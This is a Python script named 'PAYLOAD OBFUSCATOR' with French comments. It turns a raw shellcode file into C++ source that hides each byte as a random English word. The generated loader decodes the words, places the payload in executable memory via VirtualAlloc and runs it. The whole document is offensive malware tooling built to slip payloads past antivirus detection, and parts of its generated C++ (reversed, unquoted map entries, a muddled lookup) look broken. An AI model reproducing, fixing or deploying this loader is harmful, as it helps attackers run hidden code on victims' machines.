#!/usr/bin/env python3

import sys
import requests
import random
import json


def main(input_file):

    cpp_headers = '''#include <iostream>
#include <string>
#include <map>
#include <vector>
#include <sstream>
#include <iterator>
#include <algorithm>
#include <windows.h>
    '''


    # Creation du dictionnaire de correspondance
    word_site = "https://www.mit.edu/~ecprice/wordlist.10000"
    response = requests.get(word_site)
    words = response.content.splitlines()
    words = [word.decode('utf-8') for word in words]
    random.shuffle(words)
    hex_values = [f'0x{i:02x}' for i in range(256)]
    word_dict = dict(zip(hex_values, words[:256]))
    dict_items = [f'std::make_pair("{hex_val}", {word})' for word, hex_val in word_dict.items()]
    cpp_dict = "std::map<std::string, uint8_t> wordDict = {\n    " + ",\n    ".join(dict_items) + "\n};"



    sub_encoded = 0
    encoded_string = ""
    concat_all = "std::string obf_data = "
    with open(input_file, 'rb') as f_in:
        byte = f_in.read(1)
        while byte:
            sub_encoded=sub_encoded+1
            max_words_per_part = 50
            concat_all += "data"+str(sub_encoded)+"+"
            sub_generated_encoded_string = "std::string data"+str(sub_encoded)+" = \""
            for i in range(0, max_words_per_part):
                hex_value = f"0x{byte.hex()}"
                if hex_value in word_dict:
                    sub_generated_encoded_string += word_dict[hex_value] + ' '                    
                byte = f_in.read(1)
            sub_generated_encoded_string += "\";"
            encoded_string += sub_generated_encoded_string + "\n"
    concat_all = concat_all[:-1] + ";"
    encoded_string = encoded_string.rstrip()


    cpp_decode_function = '''
std::string decodePayload(const std::string& encoded) {
std::istringstream iss(encoded);
std::string word;
std::string decoded = "";
while (iss >> word) {
    auto it = std::find_if(wordDict.begin(), wordDict.end(), [&](const std::pair<std::string, uint8_t>& pair) {
        return pair.second == wordDict[word];
    });
    if (it != wordDict.end()) {
        decoded += static_cast<char>(it->second);  // Convertit uint8_t en char
    } else {
        std::cerr << "[!] Erreur de décodage : mot inconnu " << word << std::endl;
    }
}
return decoded;
}
    '''


    cpp_exec_function = '''
void executePayload(const std::string& payload) {
    void* exec_mem = VirtualAlloc(0, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    std::memcpy(exec_mem, payload.data(), payload.size());
    auto func = reinterpret_cast<void(*)()>(exec_mem);
    std::cout << "[+] Execution du payload..." << std::endl;
    func();
}
    '''


    cpp_main_function = '''
int main() {
    std::string decoded_payload = decodePayload(obf_data);
    executePayload(decoded_payload);
    return 0;
}
    '''


    # Combiner toutes les parties dans un fichier C++ généré
    cpp_code = f"{cpp_headers}\n\n\n{cpp_dict}\n\n\n{encoded_string}\n\n\n{concat_all}\n\n\n{cpp_decode_function}\n\n\n{cpp_exec_function}\n\n\n{cpp_main_function}"
    # Sauvegarder le code généré dans un fichier
    with open('generated_code.cpp', 'w') as f:
        f.write(cpp_code)
    print("Code C++ généré avec succès dans 'generated_code.cpp'")





if __name__ == "__main__":
    print("##########################################")
    print("########### PAYLOAD OBFUSCATOR ###########")
    print("##########################################\n")
    if len(sys.argv) != 2:
        print("Usage: python encode_cpp.py <path_to_raw_payload_file>\n")
        sys.exit(1)
    
    file_path = sys.argv[1]
    main(file_path)